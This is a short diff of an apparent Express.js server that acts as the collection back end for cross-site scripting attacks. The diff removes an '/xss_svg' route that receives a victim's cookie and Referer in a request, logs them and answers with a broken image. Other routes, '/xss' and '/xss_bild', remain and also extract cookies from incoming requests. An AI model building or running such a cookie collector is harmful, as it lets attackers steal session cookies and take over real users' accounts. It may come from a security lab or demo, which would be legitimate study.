@@ -25,16 +25,6 @@ app.get('/xss', (req, res) => {
     }
 });
 
-app.get('/xss_svg', (req, res) => {
-    const cookieValue = req.query.cookie;
-    const referer = req.headers.referer;
-    if (cookieValue && referer) {
-        logCookie(cookieValue.toString(), referer)
-        console.log('Received cookie:', cookieValue);
-        res.sendFile(brokenImagePath)
-    }
-})
-
 
 app.get('/xss_bild', (req, res) => {
     // Extrahiert den 'cookie' aus der Anfrage
